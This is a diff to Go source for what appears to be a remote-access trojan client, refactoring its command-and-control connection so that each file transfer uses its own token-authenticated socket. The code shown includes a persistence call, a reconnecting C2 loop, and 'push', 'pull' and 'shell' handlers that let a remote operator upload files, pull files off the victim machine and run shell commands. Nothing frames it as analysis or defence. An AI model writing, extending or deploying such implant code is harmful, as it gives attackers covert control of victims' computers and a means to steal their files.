@@ -27,10 +27,11 @@ func main(){
   persist.CheckAndExec(i)
 
   // C2
-  handleCMD(connect())
+  token, sock := connect()
+  handleCMD(token, sock)
 }
 
-func connect()socket.Socket{
+func connect()(string, socket.Socket){
   var conn net.Conn
   var err error
   for true {
@@ -43,15 +44,16 @@ func connect()socket.Socket{
   }
 
   sock := socket.Init(conn, config.Key)
-  return sock
+  token, _ := sock.Read()
+  return token, sock
 }
 
-func handleCMD(sock socket.Socket){
+func handleCMD(token string, sock socket.Socket){
   for {
     cmd, err := sock.Read()
     if err == io.EOF {            // if socket break accidentally (reconnect)
       sock.Close()
-      sock = connect()
+      token, sock = connect()
     }
 
     switch strings.Split(cmd, " ")[0] {
@@ -64,20 +66,28 @@ func handleCMD(sock socket.Socket){
     case "push":
       cmds := strings.Split(cmd, "push")
       cmds[1] = strings.TrimSpace(cmds[1])
-      if err = sock.RecvFile(cmds[1]); err != nil {
+
+      ftoken, fconn := connect()
+      sock.Write(ftoken)
+      if err = fconn.RecvFile(cmds[1]); err != nil {
         sock.Write(fmt.Sprintf("%v", err))
       } else {
         sock.Write("Finished.")
       }
+      fconn.Close()
 
     case "pull":
       cmds := strings.Split(cmd, "pull")
       cmds[1] = strings.TrimSpace(cmds[1])
-      if err = sock.SendFile(cmds[1]); err != nil {
+
+      ftoken, fconn := connect()
+      sock.Write(ftoken)
+      if err = fconn.SendFile(cmds[1]); err != nil {
         sock.Write(fmt.Sprintf("%v", err))
       } else {
         sock.Write("Finished.")
       }
+      fconn.Close()
 
     case "shell":
       cmds := strings.Split(cmd, "shell")
